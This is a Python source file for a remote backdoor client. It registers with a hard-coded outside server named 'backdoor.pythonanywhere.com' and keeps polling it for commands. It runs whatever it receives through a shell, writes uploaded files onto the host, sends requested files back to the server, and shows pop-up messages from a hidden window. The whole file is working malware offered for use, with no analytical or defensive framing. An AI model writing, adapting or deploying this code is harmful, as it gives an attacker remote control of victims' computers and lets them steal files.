from tkinter import messagebox as msgbox
import tkinter as tk
import requests
import os
import json
import subprocess
import base64
import uuid


# SERVER_IP = 'http://127.0.0.1:5000'
SERVER_IP = 'https://backdoor.pythonanywhere.com'
ID = str(uuid.uuid4())
cwd = os.getcwd()

root = tk.Tk()
root.withdraw()
root.attributes('-topmost', True)

def send(output):
    requests.post(SERVER_IP + '/server/send/' + ID, json=output)


def main():
    global cwd

    requests.post(SERVER_IP + '/register', json={'id': ID})

    while True:
        try:
            post = requests.post(SERVER_IP + '/server/recv/' + ID, timeout=10)
            while post.status_code == 204:
                post = requests.post(SERVER_IP + '/server/recv/' + ID, timeout=10)
            payload: dict[str, str] = json.loads(post.text) 
            cmd = payload.get('command')

            if cmd == 'exit':
                requests.post(SERVER_IP + '/bye/' + ID, timeout=10)
                send({'output': 'client shell deactivated', 'error': '', 'cwd': cwd})
                exit(0)
            
            if cmd == 'upload':
                filename = payload.get('filename')
                filedata = base64.b64decode(payload.get('filedata', ''))
                file_path = os.path.join(cwd, filename)
                try:
                    with open(file_path, 'wb') as f:
                        f.write(filedata)
                    send({'output': f"Uploaded to {file_path}", 'error': None, 'cwd': cwd})
                except Exception as e:
                    send({'output': None, 'error': f"Upload failed: {e}", 'cwd': cwd})
                continue

            if cmd.startswith('download '):
                path = cmd.split(maxsplit=1)[1]
                try:
                    with open(os.path.join(cwd, path), 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode()
                    filename = os.path.basename(path)
                    send({'output': None, 'error': None, 'cwd': cwd, 'download': {'filename': filename, 'filedata': file_data}})
                except Exception as e:
                    send({'output': None, 'error': f"Download failed: {e}", 'cwd': cwd})
                continue

            if cmd.startswith('message '):
                msg = cmd.split(maxsplit=1)[1]
                msgbox.showinfo("im innocent", msg)
                send({'output': 'messaged was ok', error: '', 'cwd': cwd})
                continue

            if cmd.startswith('cd '):
                parts = cmd.split(maxsplit=1)
                new_path = os.path.abspath(os.path.join(cwd, parts[1]))
                os.path.isdir(new_path)
                if os.path.isdir(new_path):
                    cwd = new_path
                    send({'output': '', 'error': None, "cwd": cwd})
                else:
                    send({'output': None, "error": f"cd: path '{new_path}' was not found.", "cwd": cwd})
                continue

        except requests.exceptions.ReadTimeout:
            continue

        result: subprocess.CompletedProcess[bytes] = subprocess.run(cmd, shell=True, capture_output=True, cwd=cwd)
        output = result.stdout.decode()
        error = result.stderr.decode()
        output = output if output else None

        send({'error': error, 'output': output, 'cwd': cwd})


if __name__ == '__main__':
    main()
    root.destroy()